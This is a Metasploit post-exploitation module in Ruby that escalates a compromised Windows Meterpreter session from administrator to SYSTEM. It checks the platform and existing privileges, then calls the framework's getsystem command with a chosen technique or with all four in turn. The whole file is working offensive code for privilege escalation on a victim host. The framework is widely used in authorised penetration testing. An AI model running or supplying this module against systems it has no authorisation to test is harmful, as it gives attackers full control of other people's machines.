##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Escalate Get System via Administrator',
      'Description'   => %q{
          This module uses the builtin 'getsystem' command to escalate
        the current session to the SYSTEM account from an administrator
        user account.
      },
      'License'       => MSF_LICENSE,
      'Author'        => 'hdm',
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options([
      OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-4), otherwise try them all", 0])
    ])

  end

  def unsupported
    print_error("This platform is not supported with this script!")
    raise Rex::Script::Completed
  end

  def run

    technique = datastore['TECHNIQUE'].to_i

    unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)

    if is_system?
      print_good("This session already has SYSTEM privileges")
      return
    end

    begin
      result = client.priv.getsystem(technique)
      print_good("Obtained SYSTEM via technique #{result[1]}")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to obtain SYSTEM access")
    end
  end
end
